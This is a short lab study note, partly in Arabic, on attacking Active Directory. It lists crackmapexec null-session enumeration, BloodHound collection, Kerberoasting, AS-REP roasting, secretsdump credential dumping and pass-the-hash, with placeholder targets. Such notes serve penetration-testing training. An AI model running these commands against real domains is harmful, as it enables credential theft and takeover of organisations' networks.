# Active Directory Enumeration & Attacks

> Status: 🟨 In progress

## Overview
enumeration وهجمات على بيئات Active Directory: جمع معلومات عن المستخدمين والصلاحيات، رسم العلاقات بـ BloodHound، واستغلال misconfigurations زي Kerberoasting و AS-REP Roasting للوصول لـ Domain Admin.

## Key Concepts
- فرق مهم بين enumeration من حساب null/guest و enumeration من حساب domain user عادي
- BloodHound بيحوّل العلاقات المعقدة لمسار واضح نحو الهدف (DA)
- Kerberoasting بيستهدف service accounts، AS-REP Roasting بيستهدف حسابات بدون Pre-Auth

## Important Commands / Tools
```bash
crackmapexec smb <IP> -u '' -p '' --users
bloodhound-python -u <user> -p <pass> -d <domain> -ns <dc_ip> -c all
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc_ip> -request
impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <dc_ip> -no-pass
impacket-secretsdump <domain>/<user>:<pass>@<dc_ip>
```

## Lab Notes / Walkthrough
- بنيت روتين ثابت: null session enum → اجمع أسماء مستخدمين → AS-REP roast الحسابات اللي معندهاش Pre-Auth → BloodHound لو عندي أي credential صالح
- جربت pass-the-hash بعد ما جبت NTLM hash من secretsdump

## Common Mistakes / Gotchas
- نسيان ضبط الـ DNS على الـ DC IP قبل أي أداة تتعامل مع الدومين بالاسم

## Related Cheatsheet
- [../../cheatsheet/](../../cheatsheet/)
